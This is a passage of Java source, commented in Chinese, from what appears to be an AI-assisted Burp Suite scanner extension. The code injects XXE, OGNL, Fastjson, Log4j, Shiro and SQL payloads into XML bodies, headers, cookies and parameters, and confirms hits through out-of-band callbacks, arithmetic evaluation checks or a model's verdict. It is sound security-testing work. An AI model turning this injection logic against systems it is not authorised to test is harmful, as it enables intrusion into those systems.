     * {@code *+json}）的一律不动 —— GraphQL 的 body 长得像 JSON 但不是 JSON，判据用「真的能按 JSON 解析」，
     * 所以它不会被误标成 application/json。
     */
    private byte[] alignBodyContentType(byte[] modifiedRequest, String payload, IRequestInfo requestInfo) {
        if (modifiedRequest == null || payload == null) return modifiedRequest;
        String current = this.getContentType(requestInfo);
        String lower = current == null ? "" : current.toLowerCase(java.util.Locale.ROOT);
        boolean obviouslyWrong = current == null || lower.contains("x-www-form-urlencoded")
                || lower.contains("multipart/form-data") || lower.contains("text/plain");
        if (!obviouslyWrong) return modifiedRequest;
        String wanted;
        String trimmed = payload.trim();
        if (looksLikeJsonDocument(trimmed)) {
            wanted = "application/json";
        } else if (trimmed.startsWith("<?xml") || trimmed.startsWith("<!DOCTYPE")) {
            wanted = "application/xml";
        } else {
            return modifiedRequest;                 // GraphQL / 纯文本 / 其它：不动
        }
        this.logPanel.logWarning(Msg.t("log.inject.contentTypeAligned", current == null ? Msg.t("oob.none") : current, wanted));
        return this.modifyHeaderParameter(modifiedRequest, wanted, "Content-Type");
    }

    /** 这段文本是不是一份真正的 JSON 文档（对象或数组）—— GraphQL 那种「像 JSON」的会被判否 */
    private static boolean looksLikeJsonDocument(String text) {
        if (text == null || text.isEmpty()) return false;
        char first = text.charAt(0);
        if (first != '{' && first != '[') return false;
        try {
            return com.google.gson.JsonParser.parseString(text) != null;
        }
        catch (Exception e) {
            return false;
        }
    }

    /** 整段替换 body（XML 文档 / GraphQL / 纯文本），并修正 Content-Length */
    private byte[] replaceWholeBody(byte[] originalRequest, String payload, IRequestInfo requestInfo) {
        int bodyOffset = requestInfo.getBodyOffset();
        if (bodyOffset < 0 || bodyOffset > originalRequest.length) return null;
        return this.buildRequestWithBody(originalRequest, bodyOffset, payload);
    }

    /**
     * XML 请求：载荷是完整 XML 文档（含 &lt;!DOCTYPE 或 &lt;?xml 声明）时整段替换 body —— XXE 走这条；
     * 否则按普通参数注入（Burp 的 PARAM_XML 会把载荷写进元素文本值）。
     */
    private byte[] modifyXmlRequest(byte[] originalRequest, String payload, String position, IRequestInfo requestInfo) {
        String trimmedPayload = payload.trim();
        if (trimmedPayload.contains("<!DOCTYPE") || trimmedPayload.startsWith("<?xml")) {
            this.logPanel.logWarning(Msg.t("log.inject.xmlWholeBody", position));
            return this.replaceWholeBody(originalRequest, payload, requestInfo);
        }
        byte[] viaBurp = this.modifyParameter(originalRequest, payload, position, requestInfo);
        if (viaBurp != null) return viaBurp;
        // 回落：自研元素文本替换（Burp 对 XML 参数的命名不保证与元素名一致，不能只靠 updateParameter）
        int bodyOffset = requestInfo.getBodyOffset();
        if (bodyOffset < 0 || bodyOffset > originalRequest.length) return null;
        String body = new String(originalRequest, bodyOffset, originalRequest.length - bodyOffset, StandardCharsets.UTF_8);
        String replaced = this.replaceXmlElementText(body, position, payload);
        if (replaced == null) {
            this.logPanel.logWarning(Msg.t("log.send.xmlElementMissing", position));
            return null;
        }
        return this.buildRequestWithBody(originalRequest, bodyOffset, replaced);
    }

    /**
     * 替换第一个 &lt;name&gt;文本&lt;/name&gt; 的文本值。
     * 载荷原样写入、不做转义 —— 实体引用（&amp;xxe;）是 XML 文本位置唯一能验证成功的形态，
     * 转义会把它变成无意义的字面量。
     */
    private String replaceXmlElementText(String body, String elementName, String payload) {
        if (body == null || elementName == null || elementName.isEmpty()) return null;
        String quoted = java.util.regex.Pattern.quote(elementName);
        java.util.regex.Matcher matcher = java.util.regex.Pattern
                .compile("<" + quoted + "\\s*>([\\s\\S]*?)</" + quoted + "\\s*>")
                .matcher(body);
        while (matcher.find()) {
            if (isInsideXmlSkippedRegion(body, matcher.start())) continue;
            return body.substring(0, matcher.start(1)) + payload + body.substring(matcher.end(1));
        }
        return null;
    }

    /** 该偏移是否落在 XML 注释 / CDATA / 处理指令 / DOCTYPE 内部子集里（这些区域的同名标签是假的） */
    private static boolean isInsideXmlSkippedRegion(String body, int index) {
        int comment = body.lastIndexOf("<!--", index);
        if (comment >= 0 && body.indexOf("-->", comment) > index) return true;
        int cdata = body.lastIndexOf("<![CDATA[", index);
        if (cdata >= 0 && body.indexOf("]]>", cdata) > index) return true;
        int pi = body.lastIndexOf("<?", index);
        if (pi >= 0 && body.indexOf("?>", pi) > index) return true;
        int dtd = body.lastIndexOf("<!DOCTYPE", index);
        if (dtd >= 0 && body.indexOf("]>", dtd) > index) return true;
        return false;
    }

    /** 该 position 是否是 URL 查询参数（决定 GET 请求是否做空格→+ 转换） */
    private boolean isUrlQueryPosition(IRequestInfo requestInfo, String position) {
        if (requestInfo == null || position == null || position.isEmpty()) return false;
        if (position.equalsIgnoreCase(WHOLE_BODY_POSITION)) return false;
        String headerName = stripHeaderPrefix(position);
        if (isInjectableHeader(headerName) && !this.matchesParameterName(requestInfo, position)) {
            return false;
        }
        List<IParameter> parameters = requestInfo.getParameters();
        if (parameters == null) return false;
        for (IParameter param : parameters) {
            if (param == null || param.getName() == null) continue;
            if (param.getName().equalsIgnoreCase(position)) {
                return param.getType() == IParameter.PARAM_URL;
            }
        }
        return false;
    }

    /** position 是否指向 urlencoded body 里的参数（这类「值」同样不能带 & # +，见 sendTestRequest） */
    private boolean isFormBodyPosition(IRequestInfo requestInfo, String position) {
        if (requestInfo == null || position == null || position.isEmpty()) return false;
        if (position.equalsIgnoreCase(WHOLE_BODY_POSITION) || isUrlPathPosition(position)) return false;
        // multipart 的 part 值**不是** urlencoded 值：这条链路上没有任何一方会去解码它 ——
        // 浏览器不会编码 part 值，容器也不会解码，编了只能把载荷变成字面量。
        // 而 Burp 会把 multipart 的 part 名（name="id"）报成 PARAM_BODY，只信参数类型就会中招：
        // 实测 S2-059 靶场（multipart 的 id）每一条 OGNL 载荷都被发成 %25%7B100*100%7D，
        // 服务端原样回显这个字面量 → %{...} 永远到不了 OGNL 解析器 → 全部载荷白打。
        // 判据只能用 Content-Type（不看参数类型），这也是本方法名里 urlencoded 的本义。
        if (isMultipartContentType(this.getContentType(requestInfo))) return false;
        String headerName = stripHeaderPrefix(position);
        if (isInjectableHeader(headerName) && !this.matchesParameterName(requestInfo, position)) {
            return false;
        }
        List<IParameter> parameters = requestInfo.getParameters();
        if (parameters == null) return false;
        for (IParameter param : parameters) {
            if (param == null || param.getName() == null) continue;
            if (param.getName().equalsIgnoreCase(position)) {
                return param.getType() == IParameter.PARAM_BODY;
            }
        }
        return false;
    }

    /**
     * 参数「值」形态载荷的就地百分号编码（URL 查询参数与 urlencoded body 位置共用）。
     *
     * <p>编两类字符：结构字符 {@code & # +}（不编会被服务端当结构），以及
     * {@link #needsUrlEncoding} 里那些 URL 非法/容器会 400 的字符。
     * 唯一不碰的是 {@code %}：{@code %27}、{@code %252F} 这类「载荷本身就是编码形态」的手法必须原样发出。
     */
    static String encodeParamValue(String payload) {
        if (payload == null || payload.isEmpty()) return payload;
        StringBuilder sb = new StringBuilder(payload.length() + 8);
        for (int i = 0; i < payload.length(); ) {
            int cp = payload.codePointAt(i);
            i += Character.charCount(cp);
            switch (cp) {
                case '&': sb.append("%26"); break;
                case '#': sb.append("%23"); break;
                case '+': sb.append("%2B"); break;
                // % 绝不编码：载荷本身就常是编码形态（%27、%252F、%2e），再编一次就成字面量了
                // 只有「% 后面跟两个十六进制数字」才是合法转义（%27、%252F、%2e、%00），必须原样保留；
                // **裸 % 必须编成 %25**：服务端解析表单时会把 % 当转义起点，转义非法时整个参数作废
                // （实测 Tomcat：name=%%7B100*100%7D → 参数值解成空；name=%25%7B100*100%7D → 正确得到 %{100*100}）。
                // 受影响的是所有带裸 % 的载荷：OGNL 的 %{...}（Struts2 那几类全是）、SQL 的 LIKE '%' 等。
                case '%':
                    if (isPercentEscape(payload, i - 1)) {
                        sb.append('%');
                    } else {
                        sb.append("%25");
                    }
                    break;
                default:
                    if (needsUrlEncoding(cp)) {
                        for (byte b : new String(Character.toChars(cp)).getBytes(StandardCharsets.UTF_8)) {
                            sb.append('%').append(HEX[(b >> 4) & 0xF]).append(HEX[b & 0xF]);
                        }
                    } else {
                        sb.appendCodePoint(cp);
                    }
            }
        }
        return sb.toString();
    }

    private static final char[] HEX = "0123456789ABCDEF".toCharArray();

    /** payload 里 at 位置的 {@code %} 是不是合法转义（后面恰好跟两个十六进制数字） */
    private static boolean isPercentEscape(String payload, int at) {
        return at >= 0 && at + 2 < payload.length()
                && isHexDigit(payload.charAt(at + 1)) && isHexDigit(payload.charAt(at + 2));
    }

    private static boolean isHexDigit(char c) {
        return c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F';
    }

    /**
     * 单个 cookie **值**位置的载荷处理（真实 cookie 参数，不是 `header:Cookie` 整段替换）。
     *
     * <p>cookie 值是唯一「住在请求头里、却没走 header 注入路径」的位置（它经 Burp 的
     * `updateParameter(PARAM_COOKIE)` 直接写进 Cookie 头），所以两件事必须在这里做：
     * <ul>
     *   <li>空格 → {@code %20}：RFC 6265 的 cookie-value 不允许空格，Tomcat 8.5+ 的严格解析器
     *       会把整个 cookie **丢掉**（载荷等于没发，日志里只有一行 warn，客户端看不出来）；</li>
     *   <li>剔除 CR/LF：cookie 值里的换行会伪造出新的请求头（`header:名称` 那条路径本来就剔，
     *       cookie 值这条以前漏了）。</li>
     * </ul>
     * 其余字符一律不动 —— 尤其 <b>不能</b>碰 {@code +} 与 {@code =}：Shiro 的 rememberMe 值就是
     * base64，编成 {@code %2B} 之后服务端拿到的是字面量、反序列化直接失败。
     */
    static String sanitizeCookieValue(String payload) {
        if (payload == null || payload.isEmpty()) return payload;
        return payload.replace("\r", "").replace("\n", "").replace(" ", "%20");
    }

    /** position 是否指向一个**真实的 cookie 参数**（PARAM_COOKIE）；`header:Cookie` 不算（那是整段替换） */
    private boolean isCookieValuePosition(IRequestInfo requestInfo, String position) {
        if (requestInfo == null || position == null || position.isEmpty()) return false;
        if (position.equalsIgnoreCase(WHOLE_BODY_POSITION) || isUrlPathPosition(position)) return false;
        String headerName = stripHeaderPrefix(position);
        if (headerName.equalsIgnoreCase("cookie")) return false;      // header:Cookie 走 header 路径
        List<IParameter> parameters = requestInfo.getParameters();
        if (parameters == null) return false;
        for (IParameter param : parameters) {
            if (param == null || param.getName() == null) continue;
            if (param.getName().equalsIgnoreCase(position)) {
                return param.getType() == IParameter.PARAM_COOKIE;
            }
        }
        return false;
    }

    /**
     * URL 里不能原样出现的字符 —— 编不编不是审美问题：
     * <ul>
     *   <li>Tomcat 这类容器对请求行里的 {@code " < > \ ^ ` { | } [ ]} 直接回 **400**，
     *       GET 查询参数里的 JSON 载荷（Fastjson 的 {@code {"@type":…}}、数组形态的 {@code [ ]}）
     *       不编码就根本到不了应用（实测：靶场里 Fastjson 的 GET 注入全部失败）；</li>
     *   <li>控制字符与非 ASCII 同理（非 ASCII 按 UTF-8 逐字节编码）。</li>
     * </ul>
     * 服务端对查询串与 urlencoded body 都会做一次百分号解码，所以编过的载荷到应用时与原文一致；
     * 空格不在这里处理（调用方统一转成 {@code +}，与既有行为一致）。
     * 不编 {@code ' ( ) , ; : = @ $ ! *} 这些合法字符：SQL 载荷里的引号、以及已经是编码形态的写法都依赖原样发出。
     */
    private static boolean needsUrlEncoding(int cp) {
        if (cp < 0x20 || cp == 0x7F) return true;          // 控制字符
        if (cp > 0x7E) return true;                        // 非 ASCII
        return "\"<>\\^`{|}[]".indexOf(cp) >= 0;
    }

    private boolean isInjectableHeader(String position) {
        if (position == null) return false;
        String lower = position.toLowerCase();
        return lower.equals("origin") || lower.equals("referer") || lower.equals("x-forwarded-for") ||
               lower.equals("x-real-ip") || lower.equals("x-originating-ip") ||
               lower.equals("content-type") || lower.equals("cookie") ||
               // User-Agent 是 Log4j2 最经典的注入点，必须允许
               lower.equals("user-agent") ||
               lower.equals("authorization") || lower.equals("x-api-key") ||
               lower.startsWith("x-") || lower.startsWith("header:");
    }

    private byte[] modifyHeaderParameter(byte[] originalRequest, String payload, String headerName) {
        try {
            // 载荷里的 CR/LF 会伪造出新的 header 甚至 body，注入前一律剔除
            String safePayload = payload.replace("\r", "").replace("\n", "");
            String lowerHeader = headerName.toLowerCase();
            String headerLine = headerName + ": " + safePayload;
            int bodyOffset = this.helpers.analyzeRequest(originalRequest).getBodyOffset();
            if (bodyOffset < 0 || bodyOffset > originalRequest.length) {
                bodyOffset = originalRequest.length;
            }
            // 只解码 header 区，body 原样保留字节
            String headersSection = new String(originalRequest, 0, bodyOffset, StandardCharsets.UTF_8);
            // 去掉 header 区末尾的换行（\r\n 两个字符都要去，只去 \n 会留下孤立的 \r
            // 并在重建时多出空行，把 header 挤到空行之后）
            while (headersSection.endsWith("\n") || headersSection.endsWith("\r")) {
                headersSection = headersSection.substring(0, headersSection.length() - 1);
            }
            String[] headerLines = headersSection.split("\r?\n", -1);
            StringBuilder newHeaders = new StringBuilder();
            boolean headerFound = false;
            for (String line : headerLines) {
                if (line.toLowerCase().startsWith(lowerHeader + ":")) {
                    newHeaders.append(headerLine).append("\r\n");
                    headerFound = true;
                } else {
                    newHeaders.append(line).append("\r\n");
                }
            }
            if (!headerFound) {
                newHeaders.append(headerLine).append("\r\n");
            }
            newHeaders.append("\r\n");       // header 与 body 之间的分隔空行
            byte[] newHeaderBytes = newHeaders.toString().getBytes(StandardCharsets.UTF_8);
            byte[] result = new byte[newHeaderBytes.length + (originalRequest.length - bodyOffset)];
            System.arraycopy(newHeaderBytes, 0, result, 0, newHeaderBytes.length);
            System.arraycopy(originalRequest, bodyOffset, result, newHeaderBytes.length, originalRequest.length - bodyOffset);
            return result;
        } catch (Exception e) {
            this.logPanel.logError(Msg.t("log.inject.headerModifyFailed", headerName, loggablePayload(payload)), e);
            return null;
        }
    }

    private void processTestResult(ScanTask task, IHttpRequestResponse testResponse, int displayIndex, int totalPayloads,
                                   String vulnType, String testData, String position, long elapsedMs, OobProbe oob,
                                   java.util.concurrent.atomic.AtomicInteger noDiffSkips,
                                   Map<String, ProbeAnchor> probeAnchors, byte[] requestBytes) {
        // 每条载荷的日志前缀：结论行都带上「载荷N/M → 类型」，一条载荷一眼一行。
        // displayIndex 是这条载荷在本次载荷列表里的序号，与发送行、外带回连行、探针记录编号同源。
        String payloadTag = "载荷" + displayIndex + "/" + totalPayloads + " → " + formatVulnName(vulnType);
        // 外带载荷的证据在【外带回连记录】里，不在响应体里：目标回 204/空体、甚至连接被重置，
        // 只要它把载荷写进了日志/发了请求，回连记录照样成立 —— 这类载荷不能因为「响应为空」就跳过验证
        boolean oobEvidenceAvailable = oob != null && oob.failure == null;
        // 「没有响应体」只有一种含义：目标没回东西。超时 / Burp 返回 null / 发送异常都落到这里
        // （sendTestRequest 三种情况都给一个只带请求的 SentRequest，见那里），空体响应（204）同样落这里。
        // 探针记录已经建好了 —— 详情面板里看得到发出去的包，这里只决定「判不判」。
        byte[] testBytes = testResponse != null ? testResponse.getResponse() : null;
        String responseStr = testBytes != null ? new String(testBytes, StandardCharsets.UTF_8) : "";
        if (responseStr.isEmpty()) {
            if (!oobEvidenceAvailable) {
                this.logPanel.logWarning(Msg.t("log.noResponse.empty", payloadTag, position));
                return;
            }
            // 外带载荷的响应常常就是空的（204 / 直接断连），证据在回连记录里，不能因此判负
            this.logPanel.logWarning(Msg.t("log.noResponse.oobOnly", payloadTag, position));
        }
        // ① 有回连记录 → 程序直接判漏洞，**不再问 AI**。
        // 记录是本次请求专属随机前缀名下的解析，只有目标真的执行了载荷才会产生：
        // 这是确定性证据，模型除了确认没有别的可做（还得花一次最贵的调用，并且可能给低置信度）。
        // 顺带把外带验证的成本从「一次 AI 调用」压到「一次 HTTP 查询」，几十条外带载荷不再排队等到收尾超时。
        if (oobEvidenceAvailable && oob.records != null && !oob.records.isEmpty()) {
            this.recordOobFinding(task, testResponse, vulnType, testData, position, displayIndex, payloadTag, oob);
            this.invalidateControlIfSelf(probeAnchors, position, vulnType, requestBytes, displayIndex);
            return;
        }
        // ② Struts2 的算术求值：与回连记录同理 —— 乘积是**服务器算出来的**，不是我们的输入回显，
        // 所以由代码直接判定，不问模型。实测过 AI 在这一步判错过：演示环境把原始输入也回显在页面上
        // （`your input id: %{100*100}`），而求值结果在标签属性里（`<a id="10000">`）——
        // 提示词里那句「表达式原样返回不算」让它把回显当成了没求值，真漏洞就这么被否掉。
        String arithmetic = strutsArithmeticEvidence(testData, testBytes,
                task != null ? task.getOriginalResponseBytes() : null);
        if (arithmetic != null) {
            this.recordArithmeticFinding(task, testResponse, vulnType, testData, position, displayIndex, payloadTag, arithmetic);
            this.invalidateControlIfSelf(probeAnchors, position, vulnType, requestBytes, displayIndex);
            return;
        }
        // 三类证据（响应差异、耗时差、回连记录）一个都没有时，AI 只可能判「没有漏洞」——
        // 这次调用纯属浪费（验证是整轮扫描最贵的一环），还会给模型留出「从毫无差异的响应里
        // 编出证据」的机会。这里按「无变化即无漏洞」直接判负，并记一行日志说明。
        // （testBytes 在上面「没有响应体」那一支里已经取好了，这里直接用，别再各取一次）
        byte[] diffBaseline = task != null ? task.getOriginalResponseBytes() : null;
        long diffBaselineMillis = task != null ? task.getOriginalResponseMillis() : -1L;
        // 两个口径必须分开算，不能共用一个布尔：
        // ① baselineOnly 给下面「回连通道不可用」那一支用。它的语义是「这次的响应本身毫无变化」——
        //    不能被**同组合别的载荷**的差异掀翻：盲外带载荷的响应一致本来就说明不了问题。
        boolean baselineOnly = noObservableDifference(diffBaseline, diffBaselineMillis, testBytes, elapsedMs, false, null);
        // ② comboNoDiff 给「跳过 AI 验证」那一支用，带上同组合的对照锚点。
        //    响应与基线一致、却与同组合对照不同 = 同一个参数换个无害值行为就变了，这正是布尔盲注
        //    那类**成对**证据的形态，必须交给模型看，不能按「与基线一致即无漏洞」跳过。
        //    对照为 null（组合第一条、或没记到）时退化成与旧行为逐字一致。
        ProbeAnchor control = this.findProbeAnchor(probeAnchors, position, vulnType, requestBytes, displayIndex);
        boolean comboNoDiff = noObservableDifference(diffBaseline, diffBaselineMillis, testBytes, elapsedMs, false,
                control != null ? control.response : null);
        if (oob != null && oob.failure != null) {
            // ② 回连通道不可用（没拿到域名 / 查询失败）：**没有记录不是反向证据**。
            // 盲外带类载荷（命令注入、盲 XXE/SSRF）本来就不改响应，响应一致完全说明不了问题 ——
            // 这里既不能报漏洞，也不能记「无漏洞」，只能记「未判定」（用户看到的是没结论，而不是安全）。
            if (baselineOnly) {
                this.logPanel.logStep(Msg.t("log.step5.oobUnjudged", payloadTag, oob.failure));
                return;
            }
            // 响应有差异时仍有别的证据可看（回显、报错里出现我们的域名…）→ 交给 AI，
            // buildOastBlock 会告诉它回连通道不可用、不要把「没有记录」当证据
        } else if (comboNoDiff) {
            noDiffSkips.incrementAndGet();
            this.logPanel.logStep(Msg.t("log.step5.noDiff", payloadTag));
            return;
        }
        String testRequestStr = testResponse != null && testResponse.getRequest() != null
                ? new String(testResponse.getRequest(), StandardCharsets.UTF_8) : "";
        JsonObject verification = this.verifyVulnerability(task, testRequestStr, testData, testBytes, vulnType, elapsedMs, oob, control);
        if (verification == null) {
            String failReason = this.getVerifyFailReason();
            this.reportError(Msg.t("log.step5.verifyFailedPrint", task.getId(), displayIndex,
                    Msg.typeNameOf(vulnType), loggablePayload(testData),
                    failReason == null ? Msg.t("verify.fail.unknown") : failReason));
            this.logPanel.logError(Msg.t("log.step5.verifyFailed", payloadTag));
            return;
        }
        // verification 已经过 normalizeVerifyResponse 规范化：直接复用同一套字段读取
        // （内联再写一遍会与 findBooleanField/findIntField 漂移，例如 "on"/"off" 只在后者认）
        Boolean vulnerable = findBooleanField(verification, "vulnerable");
        boolean isVulnerable = vulnerable != null && vulnerable;
        Integer confidenceValue = findIntField(verification, "confidence");
        int confidence = clampConfidence(confidenceValue);
        String aiVulnType = this.safeGetString(verification, "vulnType", vulnType);
        String finalVulnType = this.resolveVulnType(task, aiVulnType, vulnType);
        if (!isVulnerable || confidence < CONFIDENCE_REPORT_THRESHOLD) {
            if (oob != null && oob.failure != null) {
                // 回连通道不可用，而模型也没能从响应里确认 —— 这条载荷的**主要证据通道是坏的**，
                // 记成「未发现漏洞」会让用户把「证据不足」读成「目标没问题」，正是
                // buildOastBlock 那一整套措辞在防的误读（查询失败不是反向证据）。
                // 实测踩到过：三条载荷的轮询超时，日志里全是「未发现漏洞」，看不出其实没判过。
                // 只有带外带域名的载荷才会走到这里（oob 非空 = 这条载荷依赖回连证据）
                this.logPanel.logStep(Msg.t("log.step5.oobUnjudgedNoConfirm", payloadTag));
                return;
            }
            // 「未发现漏洞」这一行**只留结论**：不打置信度（那里的数字是模型对「不存在」的把握，
            // 会被读成「有漏洞的概率」，用户要求去掉），也不打模型给的理由（用户要求去掉）。
            // 「发现漏洞」那行保留置信度 —— 那才是「有漏洞的概率」，也是 95 分门限的依据。
            this.logPanel.logStep(Msg.t("log.step5.noVuln", payloadTag));
            return;
        }
        this.logPanel.logVuln(Msg.t("log.step6.found", payloadTag, Msg.typeNameOf(finalVulnType), confidence));
        // 模型判成立也算「对照自己带上了证据」→ 同样作废（判否的那一支上面已经 return 了）
        this.invalidateControlIfSelf(probeAnchors, position, vulnType, requestBytes, displayIndex);
        // 类型必须用钉死后的 finalVulnType：记录里的 vulnType 是报告的「漏洞类型」与修复建议的依据，
        // 直接用模型原文会让「扫 Shiro 却报 SQL 注入 + SQL 修复建议」这种错位漏到报告里
        VulnResult vuln = this.createVulnResult(verification, testResponse, finalVulnType);
        vuln.setPayload(testData);
        vuln.setPosition(position);
        vuln.setConfidence(confidence);
        // 同一（参数, 类型）只留证据最强的那个：一个组合 9 条载荷常常好几条都成立，
        // 逐条计入会让「漏洞数」虚高（用户看到「一个参数上发现 4 个 SQL 注入」）
        boolean recorded = task.addOrMergeVulnerability(vuln);
        if (!recorded) {
            this.logPanel.logStep(Msg.t("log.step5.dup", payloadTag, confidence));
        } else {
            if (this.vulnListener != null) {
                this.vulnListener.onVulnerabilityFound(task, vuln);
            }
        }
        if (task.getVulnName() == null || task.getVulnName().isEmpty()) {
            task.setVulnName(finalVulnType);
        }
    }

    /**
     * \u7528\u9a8c\u8bc1\u7ed3\u679c\u4e0e\u8bc1\u636e\u62a5\u6587\u6784\u9020\u4e00\u6761\u6f0f\u6d1e\u8bb0\u5f55\u3002
     *
     * @param resolvedType \u5df2\u7ecf\u8fc7 {@link #resolveVulnType} \u7684\u7c7b\u578b\uff08\u5355\u6f0f\u6d1e\u6a21\u5f0f\u9489\u6b7b\u5728\u672c\u6b21\u626b\u63cf\u7684\u7c7b\u578b\u4e0a\uff09\u2014\u2014
     *                     \u8bb0\u5f55\u91cc\u7684 vulnType \u662f\u62a5\u544a\u7684\u300c\u6f0f\u6d1e\u7c7b\u578b\u300d\u4e0e\u4fee\u590d\u5efa\u8bae\u7684\u4f9d\u636e\uff0c\u5fc5\u987b\u7528\u5b83\u800c\u4e0d\u662f\u6a21\u578b\u539f\u6587
     */
    private VulnResult createVulnResult(JsonObject verification, IHttpRequestResponse proofRequest, String resolvedType) {
        ScanTask.VulnLevel vulnLevel;
        String vulnType = resolvedType != null && !resolvedType.isEmpty()
                ? resolvedType : this.safeGetString(verification, "vulnType", "UNKNOWN");
        String level = this.safeGetString(verification, "level", "MEDIUM");
        try {
            vulnLevel = ScanTask.VulnLevel.valueOf(level.toUpperCase(java.util.Locale.ROOT));
        }
        catch (Exception e) {
            vulnLevel = ScanTask.VulnLevel.MEDIUM;
        }
        VulnResult vuln = new VulnResult(vulnType, this.formatVulnName(vulnType), vulnLevel);
        String description = this.safeGetString(verification, "description", "AI\u672a\u63d0\u4f9b\u8be6\u7ec6\u63cf\u8ff0");
        vuln.setDescription(description);
        String tag = this.safeGetString(verification, "tag", null);
        if (tag != null && !tag.isEmpty()) {
            vuln.setTag(tag);
        } else {
            vuln.setTag(this.formatVulnName(vulnType));
        }
        fillEvidence(vuln, proofRequest);
        return vuln;
    }

    /** 证据报文（原始请求/响应字节）—— 报告里的「完整请求包 / 完整响应包」就是它 */
    private void fillEvidence(VulnResult vuln, IHttpRequestResponse proofRequest) {
        if (vuln == null || proofRequest == null) return;
        if (proofRequest.getRequest() != null) {
            vuln.setRequestData(new String(proofRequest.getRequest(), StandardCharsets.UTF_8));
        }
        if (proofRequest.getResponse() != null) {
            vuln.setResponseData(new String(proofRequest.getResponse(), StandardCharsets.UTF_8));
        }
    }

    /** Struts2 算术载荷里的因子下限：两个因子都 ≥ 10（乘积 4 位数起步）才认，避免 %{1*1} 这种到处都有的数字 */
    private static final int ARITHMETIC_MIN_FACTOR = 10;

    /** 算术载荷的形态：{@code %{a*b}} 或 {@code ${a*b}}（求值与诊断共用同一个正则） */
    private static final java.util.regex.Pattern ARITHMETIC_PATTERN =
            java.util.regex.Pattern.compile("[%$]\\{\\s*(\\d+)\\s*\\*\\s*(\\d+)\\s*}");

    /**
     * Struts2 的算术求值证据：载荷是 {@code %{a*b}}（或 {@code ${a*b}}），且响应里出现了乘积、
     * 而**基线里没有**这个值 —— 说明服务器真的把表达式算了一遍。
     *
     * <p>为什么代码判而不是问模型：这个证据完全可计算（服务器算出来的数，不是我们的输入），
     * 而且实测 AI 在这一步判错过一次 —— 演示环境会把原始输入也回显到页面
     * （{@code your input id: %{100*100}}），模型据此认为「表达式原样返回」，忽略了同一响应里
     * 标签属性上的 {@code <a id="10000">}。与回连记录一样：能由代码判定的确定性证据不该交给模型。
     *
     * @return 命中的描述（如 {@code 100*100 = 10000}）；不成立返回 null
     */
    static String strutsArithmeticEvidence(String payload, byte[] testResponse, byte[] baseline) {
        if (payload == null || testResponse == null) return null;
        java.util.regex.Matcher matcher = ARITHMETIC_PATTERN.matcher(payload);
        if (!matcher.find()) return null;
        try {
            long a = Long.parseLong(matcher.group(1));
            long b = Long.parseLong(matcher.group(2));
            if (a < ARITHMETIC_MIN_FACTOR || b < ARITHMETIC_MIN_FACTOR) return null;
            String product = String.valueOf(a * b);
            String test = new String(testResponse, StandardCharsets.UTF_8);
            if (!test.contains(product)) return null;
            // 缺基线（步骤 1 拿到了响应对象但没拿到响应体）时**不能**只凭「响应里有这个乘积」定论：
            // 这条证据是代码直判、置信度 100、不问 AI，而 10000 这种数字在页面里顺带出现太常见 ——
            // 少一侧就交给 AI，与 noObservableDifference「缺任一侧就走 AI」是同一个原则。
            if (baseline == null) return null;
            if (new String(baseline, StandardCharsets.UTF_8).contains(product)) {
                return null;                      // 基线里本来就有这个数字 → 不能算求值证据
            }
            return a + "*" + b + " = " + product;
        }
        catch (Exception e) {
            return null;
        }
    }

    /** 算术求值确认的漏洞（与回连记录一样不走 AI）：类型按 Struts2 OGNL注入 记，等级走 {@link #oobLevelFor} */
    private void recordArithmeticFinding(ScanTask task, IHttpRequestResponse testResponse, String vulnType,
                                         String testData, String position, int displayIndex, String payloadTag,
                                         String evidence) {
        String finalType = this.resolveVulnType(task, "Struts2 OGNL注入", vulnType);
        ScanTask.VulnLevel level = oobLevelFor(finalType);
        this.logPanel.logVuln(Msg.t("log.step6.foundArithmetic", payloadTag, Msg.typeNameOf(finalType), evidence, OOB_CONFIRMED_CONFIDENCE));
        VulnResult vuln = new VulnResult(finalType, this.formatVulnName(finalType), level);
        vuln.setPayload(testData);
        vuln.setPosition(position);
        vuln.setConfidence(OOB_CONFIRMED_CONFIDENCE);
        vuln.setTag(this.formatVulnName(finalType));
        vuln.setDescription(Msg.t("finding.strutsArithmetic", testData, evidence));
        fillEvidence(vuln, testResponse);
        boolean recorded = task.addOrMergeVulnerability(vuln);
        if (!recorded) {
            this.logPanel.logStep(Msg.t("log.step5.dupPlain", payloadTag));
        } else if (this.vulnListener != null) {
            this.vulnListener.onVulnerabilityFound(task, vuln);
        }
        if (task.getVulnName() == null || task.getVulnName().isEmpty()) {
            task.setVulnName(finalType);
        }
    }

    /**
     * 回连记录确认的漏洞：不经过 AI，直接落库。
     *
     * <p>为什么可以省掉 AI：判据本身就是确定性的 —— 记录只认本次请求专属的随机前缀
     * （`<label>.<会话域名>`），别人无法伪造，目标也只有在真的执行了载荷时才会去解析它。
     * 模型在「有记录」这种情形下能做的只是复述，反而可能给出低于 95 的置信度让真漏洞落空。
     *
     * <p>等级按类型给（见 {@link #oobLevelFor}），描述由程序写清楚证据链：载荷 → 位置 → 前缀 → 记录。
     */
    private void recordOobFinding(ScanTask task, IHttpRequestResponse testResponse, String vulnType,
                                  String testData, String position, int displayIndex, String payloadTag, OobProbe oob) {
        String finalType = this.resolveVulnType(task, vulnType, vulnType);
        ScanTask.VulnLevel level = oobLevelFor(finalType);
        this.logPanel.logVuln(Msg.t("log.step6.foundOob", payloadTag, Msg.typeNameOf(finalType), oob.records.size(), OOB_CONFIRMED_CONFIDENCE));
        VulnResult vuln = new VulnResult(finalType, this.formatVulnName(finalType), level);
        vuln.setPayload(testData);
        vuln.setPosition(position);
        vuln.setConfidence(OOB_CONFIRMED_CONFIDENCE);
        vuln.setTag(this.formatVulnName(finalType));
        vuln.setDescription(Msg.t("finding.oobEvidence", oob.label + "." + oob.domain, position,
                String.join("\n- ", oob.records)));
        fillEvidence(vuln, testResponse);
        boolean recorded = task.addOrMergeVulnerability(vuln);
        if (!recorded) {
            this.logPanel.logStep(Msg.t("log.step5.dupPlain", payloadTag));
        } else if (this.vulnListener != null) {
            this.vulnListener.onVulnerabilityFound(task, vuln);
        }
        if (task.getVulnName() == null || task.getVulnName().isEmpty()) {
            task.setVulnName(finalType);
        }
    }

    /**
     * 回连确认的漏洞等级（只用于这类漏洞；AI 判定的漏洞仍由模型给等级）。
     * 判据是「载荷被真正执行」：命令注入与三个反序列化类型等于拿到了执行能力，给严重；
     * 其余（SSRF/XXE/SQL 等）给高危。
     */
    private static ScanTask.VulnLevel oobLevelFor(String vulnType) {
